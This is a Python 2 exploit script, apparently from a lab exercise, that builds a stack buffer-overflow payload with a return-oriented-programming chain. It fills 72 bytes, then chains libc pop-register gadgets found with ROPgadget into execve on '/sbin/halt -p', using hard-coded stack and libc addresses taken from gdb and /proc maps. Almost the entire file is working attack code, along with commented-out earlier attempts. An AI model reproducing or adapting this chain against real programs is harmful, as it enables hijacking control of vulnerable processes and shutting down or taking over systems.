from struct import pack

# Command used to extract these addresses
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdx
# buff_base = 0x7fffffffe550
buff_base = 0x7fffffffdcf0  # gdb
# buff_base = 0x7fffffffe440 # Bash
# buff_base = 0x7fffffffdd00    # bash
# buff_base = 2251799813545200
buff_base = 0x7fffffffdd90

# gdb vic... b main
# cat /proc/4361/maps | grep libc
base = 0x7ffff79e4000
rax = 0x439c8
rdi = 0x2155f  # First Argument
rsi = 0x23e6a  # Second Argument
rdx = 0x1b96  # Third Argument
execve = 0xe4e30
# 0x15dfe

rax = base + rax
rdi = base + rdi
rsi = base + rsi
rdx = base + rdx
execve = base + execve
# print hex(rax), hex(rdi), hex(rsi), hex(rdx), hex(system)

# print type(rdi)
# print rdi, rsi, rdx, execve
# rdi, rsi, rdx, execve = 0x007FFFF7A0555F, 0x0000000000000000, 0x0000000000000000, 0x007FFFF7AC8E30
# rax, rdi, rsi, rdx, execve = , 0x007FFFF7A0555F, 0x007FFFF7A07E6A, 0x007FFFF79E5B96, 0x007FFFF7AC8E30
# rdi, rsi, rdx, execve = 0x0101010101010101, 0x0202020202020202, 0x0303030303030303, 0x0404040404040404

# 72 + 8*9 = 0x90

string0 = 0x000000000000003b
string1 = buff_base + 0x80 # 72 + 8*7
string2 = buff_base + 0xA0  # 72 + 8*10
string3 = 0x00

# string4 = buff_base + 0x90

# string0 = 0x000000000000003b
# string1 = 0x007FFFFFFFDDD70
# string2 = 0x00
# string3 = 0x00
# string2 = 0x007FFFFFFFDDD88 # 0x007FFFFFFFDDD80 #0x007FFFFFFFDDD78
# string3 = 0x007FFFFasdasdFFFDDD88
# string1, string2, string3 = 0x0505050505050505, 0x0606060606060606, 0x0707070707070707

# Fill Buffer with NULL bytes
buff = "A" * 72
# 0x007ffff7a0555f

# update Return Address with gadget 1
# buff += pack("<Q", rax)
# buff += pack("<Q", string0) # value 59

buff += pack("<Q", rdi)

# # Address of /sbin/halt
buff += pack("<Q", string1)

buff += pack("<Q", rsi)
buff += pack("<Q", string2)

buff += pack("<Q", rdx)
buff += pack("<Q", string3)

buff += pack("<Q", execve)

# buff += pack("<Q", )


# buff += "A" * 8
# buff += "B" * 8
# buff += pack("<Q", 0x2f7362696e2f6861)
# buff += pack("<Q", 0x0000000000006c74)
# 2f7362696e2f6861
buff += "/sbin/halt"
# buff += "\x61\x68\x2f\x6e\x69\x62\x73\x2f"
# buff += "\x74\x6c\x00\x00\x00\x00\x00\x00"
buff += "\x00" * 6
# buff += "\x00\x00\x00\x00\x00\x00"
# 2f 62 69 6e 2f 73 68
# buff += "\x68\x73\x2f\x6e\x69\x62\x2f\x00"

# buff += "\x61\x68\x2f\x6e\x69\x62\x73\x2f"
# buff += "\x74\x6c\x00\x00\x00\x00\x00\x00"
# buff += "\x00"
# buff += "\x08" * 8
buff += "-p"
buff += "\x00" * 6
# buff += "\x70\x2d\x00\x00\x00\x00\x00\x00"
# buff += pack("<Q", 0x0000000000002d70)
buff += "\x00" * 8
buff += pack("<Q", string1)
buff += pack("<Q", string1 + 0x10)
buff += "\x00" * 8

print buff